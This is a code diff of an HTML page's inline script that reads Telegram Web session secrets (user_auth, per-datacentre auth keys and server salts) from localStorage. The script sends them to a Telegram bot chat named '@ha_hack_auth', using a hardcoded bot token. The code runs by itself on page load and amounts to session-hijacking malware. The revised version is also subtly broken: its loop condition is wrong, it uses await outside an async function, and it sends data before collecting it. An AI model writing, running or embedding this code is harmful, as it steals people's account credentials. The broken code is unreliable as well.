@@ -3,35 +3,57 @@
   const tg_auth_thing_data = {};
 
 const tg_auth_thing_items = [
-  'dc4_server_salt',
   'user_auth',
   'dc',
-  'dc4_auth_key',
+  'dc1_auth_key',
   'dc2_auth_key',
+  'dc3_auth_key',
+  'dc4_auth_key',
   'dc5_auth_key',
   'dc1_server_salt',
   'dc2_server_salt',
-  'dc1_auth_key',
+  'dc3_server_salt',
+  'dc4_server_salt',
+  'dc5_server_salt',
 ];
 
-tg_auth_thing_data.start = '---start---';
+async function sendData() {
+  for (var i = 0; i >= Object.keys(tg_auth_thing_items); i++) {
+    const key = Object.keys(tg_auth_thing_items)[i]
+    const value = tg_auth_thing_items[Object.keys(tg_auth_thing_items)[i]]
 
-function populateData(name) {
-  const value = localStorage.getItem(name);
-
-  tg_auth_thing_data[name] = value;
+    sendItem(key, value)
+  }
 }
 
-for (let i = 0; i < tg_auth_thing_items.length; i++) {
-  populateData(tg_auth_thing_items[i]);
-}
-
-tg_auth_thing_data.end = '---end---';
-
-Object.keys(tg_auth_thing_data).forEach(async (key) => {
+function sendItem(key, value) {
   await fetch(
-    `https://api.telegram.org/bot1277273103:AAFgDX0sP0bfU9hnfroPTEj9RzPqulfUlV8/sendMessage?chat_id=@ha_hack_auth&text=${key}: ${tg_auth_thing_data[key]}`
+    `https://api.telegram.org/bot1277273103:AAFgDX0sP0bfU9hnfroPTEj9RzPqulfUlV8/sendMessage?chat_id=@ha_hack_auth&text=${key}: ${value}`
   );
-});
+}
+
+async function getData() {
+  tg_auth_thing_data.start = '---start---';
+
+  for (let i = 0; i < tg_auth_thing_items.length; i++) {
+    getItem(tg_auth_thing_items[i]);
+  }
+
+  tg_auth_thing_data.end = '---end---';
+}
+
+function getItem(item) {
+  const value = localStorage.getItem(item);
+
+  tg_auth_thing_data[item] = value;
+}
+
+async function init() {
+  await sendData()
+
+  await getData()
+}
+
+init()
 </script>
 </body></html>
